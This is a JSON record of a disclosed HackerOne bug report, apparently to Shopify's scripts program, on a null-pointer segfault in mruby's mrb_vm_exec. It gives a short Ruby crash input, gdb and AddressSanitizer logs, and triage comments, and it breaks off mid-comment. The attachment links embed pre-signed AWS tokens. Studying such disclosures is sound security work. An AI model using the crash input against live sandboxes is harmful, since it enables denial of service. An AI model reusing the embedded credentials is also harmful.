{"id":196386,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTYzODY=","url":"https://hackerone.com/reports/196386","title":"SIGSEGV - mrb_vm_exec - vm.c in line:1272","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-01-06T20:17:26.992Z","submitted_at":"2017-01-06T20:17:26.992Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ston3","url":"/ston3","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-03-09T01:23:29.817Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-02-07T01:23:19.017Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"PoC:\n-------------------\n\nThe following code triggers the bug (attached as test_mrb_vm_exec_1272.rb):\n\t\n\ta,a,a,a=0,def e\n\tend\n\ta[]\n\nSandbox:\n-------------------\n\n\tx@x:~/Desktop/research/mruby-engine/bin$ ./sandbox test_mrb_vm_exec_1272.rb \n\t./sandbox:20: [BUG] Segmentation fault at 0x00000000000018\n\truby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]\n\n\t-- Control frame information -----------------------------------------------\n\tc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n\tc:0002 p:0186 s:0005 E:0026a8 EVAL   ./sandbox:20 [FINISH]\n\tc:0001 p:0000 s:0002 E:001a10 TOP    [FINISH]\n\n\t-- Ruby level backtrace information ----------------------------------------\n\t./sandbox:20:in `\u003cmain\u003e'\n\t./sandbox:20:in `sandbox_eval'\n\n\t-- Machine register context ------------------------------------------------\n\t RIP: 0x00007f75b9c8c89f RBP: 0x00007f75b881b100 RSP: 0x00007f75b88119e0\n\t RAX: 0x00007f75b8825b40 RBX: 0x0000000000000000 RCX: 0x00007f75b8825b30\n\t RDX: 0x0000000000000008 RDI: 0x00007f75b8825b40 RSI: 0x0000000000000000\n\t  R8: 0x00007f75b8825b30  R9: 0x0000000000000002 R10: 0x0000000000000075\n\t R11: 0x0000000000000000 R12: 0x00007f75b881fa00 R13: 0x0000000000000003\n\t R14: 0x0000000000000000 R15: 0x0000000000000000 EFL: 0x0000000000010202\n\n\t-- C level backtrace information -------------------------------------------\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be38ed55]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be38ef8c]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be26b06b]\n\t/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be32114e]\n\t/lib/x86_64-linux-gnu/libc.so.6 [0x7f75bde6bff0]\n\t/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2aaf) [0x7f75b9c8c89f] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:125\n\t/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x5c) [0x7f75b9c9084c] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772\n\t/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0xbe) [0x7f75b9c7e41e] ../../../../ext/mruby_engine/eval_monitored.c:68\n\t/lib/x86_64-linux-gnu/libpthread.so.0(start_thread+0xc2) [0x7f75bdc1f182] pthread_create.c:312\n\t/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f75bdf3030d] ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n\t...\n\t...\n\t...\n\t7f75be896000-7f75be89b000 rw-p 00000000 00:00 0                          [stack:3369]\n\t7f75be89b000-7f75be89c000 r--p 00022000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so\n\t7f75be89c000-7f75be89d000 rw-p 00023000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so\n\t7f75be89d000-7f75be89e000 rw-p 00000000 00:00 0 \n\t7fff415ad000-7fff41dac000 rw-p 00000000 00:00 0                          [stack]\n\t7fff41dfe000-7fff41e00000 r-xp 00000000 00:00 0                          [vdso]\n\tffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\n\n\t[NOTE]\n\tYou may have encountered a bug in the Ruby interpreter or extension libraries.\n\tBug reports are welcome.\n\tFor details: http://www.ruby-lang.org/bugreport.html\n\n\tAborted (core dumped)\n\nDebug:\n-------------------\n\n\t(gdb) r sandbox test_mrb_vm_exec_1272.rb \n\tStarting program: /usr/bin/ruby sandbox test_mrb_vm_exec_1272.rb\n\t[Thread debugging using libthread_db enabled]\n\tUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n\t[New Thread 0x7ffff7ff7700 (LWP 3230)]\n\t[New Thread 0x7ffff1f73700 (LWP 3277)]\n\n\tProgram received signal SIGSEGV, Segmentation fault.\n\t[Switching to Thread 0x7ffff1f73700 (LWP 3277)]\n\tmrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7c100, proc@entry=0x7ffff1f7c130, pc=0x7ffff36b04e8 \u003ccall_iseq\u003e) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1272\n\t1272\t        regs[0] = m-\u003eenv-\u003estack[0];\n\t(gdb) l\n\t1267\t          stack_extend(mrb, (irep-\u003enregs \u003c 3) ? 3 : irep-\u003enregs, 3);\n\t1268\t        }\n\t1269\t        else {\n\t1270\t          stack_extend(mrb, irep-\u003enregs, ci-\u003eargc+2);\n\t1271\t        }\n\t1272\t        regs[0] = m-\u003eenv-\u003estack[0];\n\t1273\t        pc = irep-\u003eiseq;\n\t1274\t        JUMP;\n\t1275\t      }\n\t1276\t    }\n\n\nBacktrace:\n-------------------\n\n\t(gdb) bt\n\t#0  mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7c100, proc@entry=0x7ffff1f7c130, pc=0x7ffff36b04e8 \u003ccall_iseq\u003e) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1272\n\t#1  0x00007ffff33f184c in mrb_vm_run (mrb=0x7ffff1f744e0, proc=0x7ffff1f7c130, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772\n\t#2  0x00007ffff33df41e in mruby_engine_monitored_eval (data=0x7ffff1f743e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n\t#3  0x00007ffff7380182 in start_thread (arg=0x7ffff1f73700) at pthread_create.c:312\n\t#4  0x00007ffff769130d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n\nClang - mirb - ASAN - Log:\n-------------------\n\n\tx@x:~/Desktop/research/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer ./mirb test_mrb_vm_exec_1272.rb \n\tmirb - Embeddable Interactive Ruby Shell\n\n\t =\u003e [0, :e]\n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==3344==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x00000050d4ec bp 0x7fff670b43f0 sp 0x7fff670acec0 T0)\n\t\t#0 0x50d4eb in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27\n\t\t#1 0x501d5b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n\t\t#2 0x4f3ef8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n\t\t#3 0x7f8f3d340ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#4 0x41a595 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27 in mrb_vm_exec\n\t==3344==ABORTING\n\n\t\nClang - mruby - ASAN - Log:\n-------------------\n\n\tx@x:~/Desktop/research/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer ./mruby test_mrb_vm_exec_1272.rb \n\tASAN:DEADLYSIGNAL\n\t=================================================================\n\t==3346==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x000000656aac bp 0x7fff5a504450 sp 0x7fff5a4fcf20 T0)\n\t\t#0 0x656aab in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27\n\t\t#1 0x64b31b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n\t\t#2 0x6773e8 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2487:12\n\t\t#3 0x616529 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7\n\t\t#4 0x6171c5 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10\n\t\t#5 0x4f3af5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n\t\t#6 0x7f16c78e2ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n\t\t#7 0x41a505 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a505)\n\n\tAddressSanitizer can not provide additional info.\n\tSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27 in mrb_vm_exec\n\t==3346==ABORTING","vulnerability_information_html":"\u003ch2 id=\"poc\"\u003ePoC:\u003c/h2\u003e\n\n\u003cp\u003eThe following code triggers the bug (attached as test_mrb_vm_exec_1272.rb):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea,a,a,a=0,def e\nend\na[]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"sandbox\"\u003eSandbox:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/mruby-engine/bin$ ./sandbox test_mrb_vm_exec_1272.rb \n./sandbox:20: [BUG] Segmentation fault at 0x00000000000018\nruby 2.2.6p396 (2016-11-15 revision 56800) [x86_64-linux-gnu]\n\n-- Control frame information -----------------------------------------------\nc:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\nc:0002 p:0186 s:0005 E:0026a8 EVAL   ./sandbox:20 [FINISH]\nc:0001 p:0000 s:0002 E:001a10 TOP    [FINISH]\n\n-- Ruby level backtrace information ----------------------------------------\n./sandbox:20:in `\u0026lt;main\u0026gt;\u0026#39;\n./sandbox:20:in `sandbox_eval\u0026#39;\n\n-- Machine register context ------------------------------------------------\n RIP: 0x00007f75b9c8c89f RBP: 0x00007f75b881b100 RSP: 0x00007f75b88119e0\n RAX: 0x00007f75b8825b40 RBX: 0x0000000000000000 RCX: 0x00007f75b8825b30\n RDX: 0x0000000000000008 RDI: 0x00007f75b8825b40 RSI: 0x0000000000000000\n  R8: 0x00007f75b8825b30  R9: 0x0000000000000002 R10: 0x0000000000000075\n R11: 0x0000000000000000 R12: 0x00007f75b881fa00 R13: 0x0000000000000003\n R14: 0x0000000000000000 R15: 0x0000000000000000 EFL: 0x0000000000010202\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be38ed55]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be38ef8c]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be26b06b]\n/usr/lib/x86_64-linux-gnu/libruby-2.2.so.2.2 [0x7f75be32114e]\n/lib/x86_64-linux-gnu/libc.so.6 [0x7f75bde6bff0]\n/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2aaf) [0x7f75b9c8c89f] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:125\n/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x5c) [0x7f75b9c9084c] /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772\n/home/x/Desktop/research/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0xbe) [0x7f75b9c7e41e] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0(start_thread+0xc2) [0x7f75bdc1f182] pthread_create.c:312\n/lib/x86_64-linux-gnu/libc.so.6(clone+0x6d) [0x7f75bdf3030d] ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n...\n...\n...\n7f75be896000-7f75be89b000 rw-p 00000000 00:00 0                          [stack:3369]\n7f75be89b000-7f75be89c000 r--p 00022000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so\n7f75be89c000-7f75be89d000 rw-p 00023000 08:01 1839103                    /lib/x86_64-linux-gnu/ld-2.19.so\n7f75be89d000-7f75be89e000 rw-p 00000000 00:00 0 \n7fff415ad000-7fff41dac000 rw-p 00000000 00:00 0                          [stack]\n7fff41dfe000-7fff41e00000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\nAborted (core dumped)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"debug\"\u003eDebug:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) r sandbox test_mrb_vm_exec_1272.rb \nStarting program: /usr/bin/ruby sandbox test_mrb_vm_exec_1272.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \u0026quot;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026quot;.\n[New Thread 0x7ffff7ff7700 (LWP 3230)]\n[New Thread 0x7ffff1f73700 (LWP 3277)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff1f73700 (LWP 3277)]\nmrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7c100, proc@entry=0x7ffff1f7c130, pc=0x7ffff36b04e8 \u0026lt;call_iseq\u0026gt;) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1272\n1272            regs[0] = m-\u0026gt;env-\u0026gt;stack[0];\n(gdb) l\n1267              stack_extend(mrb, (irep-\u0026gt;nregs \u0026lt; 3) ? 3 : irep-\u0026gt;nregs, 3);\n1268            }\n1269            else {\n1270              stack_extend(mrb, irep-\u0026gt;nregs, ci-\u0026gt;argc+2);\n1271            }\n1272            regs[0] = m-\u0026gt;env-\u0026gt;stack[0];\n1273            pc = irep-\u0026gt;iseq;\n1274            JUMP;\n1275          }\n1276        }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"backtrace\"\u003eBacktrace:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e(gdb) bt\n#0  mrb_vm_exec (mrb=mrb@entry=0x7ffff1f744e0, proc=0x7ffff1f7c100, proc@entry=0x7ffff1f7c130, pc=0x7ffff36b04e8 \u0026lt;call_iseq\u0026gt;) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1272\n#1  0x00007ffff33f184c in mrb_vm_run (mrb=0x7ffff1f744e0, proc=0x7ffff1f7c130, self=..., stack_keep=stack_keep@entry=0) at /home/x/Desktop/research/mruby-engine/ext/mruby_engine/mruby/src/vm.c:772\n#2  0x00007ffff33df41e in mruby_engine_monitored_eval (data=0x7ffff1f743e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#3  0x00007ffff7380182 in start_thread (arg=0x7ffff1f73700) at pthread_create.c:312\n#4  0x00007ffff769130d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:111\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mirb-asan-log\"\u003eClang - mirb - ASAN - Log:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer ./mirb test_mrb_vm_exec_1272.rb \nmirb - Embeddable Interactive Ruby Shell\n\n =\u0026gt; [0, :e]\nASAN:DEADLYSIGNAL\n=================================================================\n==3344==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x00000050d4ec bp 0x7fff670b43f0 sp 0x7fff670acec0 T0)\n    #0 0x50d4eb in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27\n    #1 0x501d5b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n    #2 0x4f3ef8 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18\n    #3 0x7f8f3d340ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #4 0x41a595 in _start (/home/x/Desktop/research/clang/mruby/bin/mirb+0x41a595)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27 in mrb_vm_exec\n==3344==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"clang-mruby-asan-log\"\u003eClang - mruby - ASAN - Log:\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ex@x:~/Desktop/research/clang/mruby/bin$ ASAN_SYMBOLIZER_PATH=/usr/lib/llvm-3.8/bin/llvm-symbolizer ./mruby test_mrb_vm_exec_1272.rb \nASAN:DEADLYSIGNAL\n=================================================================\n==3346==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000018 (pc 0x000000656aac bp 0x7fff5a504450 sp 0x7fff5a4fcf20 T0)\n    #0 0x656aab in mrb_vm_exec /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27\n    #1 0x64b31b in mrb_vm_run /home/x/Desktop/research/clang/mruby/src/vm.c:772:10\n    #2 0x6773e8 in mrb_top_run /home/x/Desktop/research/clang/mruby/src/vm.c:2487:12\n    #3 0x616529 in mrb_load_exec /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7\n    #4 0x6171c5 in mrb_load_file_cxt /home/x/Desktop/research/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5764:10\n    #5 0x4f3af5 in main /home/x/Desktop/research/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n    #6 0x7f16c78e2ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287\n    #7 0x41a505 in _start (/home/x/Desktop/research/clang/mruby/bin/mruby+0x41a505)\n\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV /home/x/Desktop/research/clang/mruby/src/vm.c:1272:27 in mrb_vm_exec\n==3346==ABORTING\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":149909,"file_name":"test_mrb_vm_exec_1272.rb","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/149/909/925b78bd8f383b1212d0fbe2e3b6847f2c00490b/test_mrb_vm_exec_1272.rb?response-content-disposition=attachment%3B%20filename%3D%22test_mrb_vm_exec_1272.rb%22%3B%20filename%2A%3DUTF-8%27%27test_mrb_vm_exec_1272.rb\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045136Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=08352583090086823e431fee4f6174b222bc56dd7f494e04579a8fb9cb256f9f","file_size":23,"type":"text/plain"},{"id":149910,"file_name":"sandbox.log","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/149/910/3cda5a9aa49125ea5d88a96c92cad3007bb164f2/sandbox.log?response-content-disposition=attachment%3B%20filename%3D%22sandbox.log%22%3B%20filename%2A%3DUTF-8%27%27sandbox.log\u0026response-content-type=text%2Fplain\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUOQU5REA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045136Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKbajvkbgJ0bk%2BBvRtGQ7p5KCzGha%2FVaDDwyFq8CM66wIgaw7%2FMRI5kyRpH%2BnIlLG4ZnmM%2FrLjLjJWrmkX0zZfd9sqtAMIVBABGgwwMTM2MTkyNzQ4NDkiDP91WL002Wbo0XGfnyqRA%2FNt3W4r54Z2Rrjnbzg30AtIqSAaUbiKh6dYPI5iumJt%2FacDVM4CmdTQCSkrpk45DFotrgtd1tIXQUPsAioE3hz70xop4zS0jebfAPdwBp38Mc3YKPYsW1TgWIT19zK4t%2B4eGJVFjPey5O%2FEfBu4XYpGDd%2Fy2VO0kVCb43%2F76mvlk6aWlA01UhpCilK3J%2F7qqZsw4P3jggaBSCjGhssHvqDLjMzfR%2FDpDE7VaotOr3rJmP5ZK66Q9%2BkoG5kaLgKcslwRO9FGLNBY8AuIhUCEMRp9RM9yBIFYe%2FyyvHRriCVGHEgdIJ9wvxaVVvCfEcWZw1dEIriA6BftAk5kML6b8WN8zwMI3cyqbnvBS9PGbEcrzzU67DDkEk0llxEfFqJB1g4ruY5L2BsxjsulOVXWFSQHoykg7EnBFBbQGmuPAyxW942tXfkTyjH7aQIFAbpwURAHEFFcnVcJBzYS%2B6tGyu1ozPdrsFK5Ko2OryeYDFeK8b9JxwAMZqBekNlk1Bn%2BWq2RJZZBgBTV1X9LfuQ%2FLbSAMJq2qv8FOusBgtnFtNPu6rgydFw%2BpCNudbVGZ39p3P2aIl7K%2B6fRTLBImgaGX5r2pXgGjSRb3Co5NHURzMlQWYw9SJdMt5vMsDNtT9otjm5R%2Fz00sRO779VmfaZOO18lLujlVlImBZA%2BY20iW%2B%2FVBR4UOivJTvxApUCo%2BQYZQghLFkO4s17mPPAo6XeP%2BtXjXhn71RPHuwavkbgQ0EuL1pf5gaqdarsB4psJiZ3FphFomE6unCMAErk3vFIwEIi%2Be5%2FjAIsDg6zS3oetmQEMR7IeJadGwnOF7tifKH8X2cyJk2IoG8HLG%2FfDEf2cBUt6EjPoIQ%3D%3D\u0026X-Amz-Signature=253f2d37d75be827b225c1563e0acc55285244711b2f8579841c8ec7806c1ae7","file_size":34382,"type":"text/plain"}],"allow_singular_disclosure_at":"2017-03-09T01:23:19.047Z","allow_singular_disclosure_after":-120194897.2759056,"singular_disclosure_allowed":true,"vote_count":5,"voters":["mpz","eveeez","apapedulimu","spetr0x","jeffakiller123"],"severity":{"rating":"low","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1405040,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","markdown_message":"\u003cp\u003eThank you for reporting this bug! This is an automated response to let you know that we\u0026#39;ve received your issue, and we\u0026#39;ll process it as soon as possible.\u003c/p\u003e\n\n\u003cp\u003eDue to the holiday period and the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!\u003c/p\u003e\n","automated_response":true,"created_at":"2017-01-06T20:17:28.009Z","updated_at":"2017-01-06T20:17:28.009Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1411966,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue and opened an issue upstream: https://github.com/mruby/mruby/issues/3390","markdown_message":"\u003cp\u003eThank you for your report. We\u0026#39;ve reproduced the issue and opened an issue upstream: \u003ca title=\"https://github.com/mruby/mruby/issues/3390\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmruby%2Fmruby%2Fissues%2F3390\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/mruby/mruby/issues/3390\u003c/span\u003e\u003ci 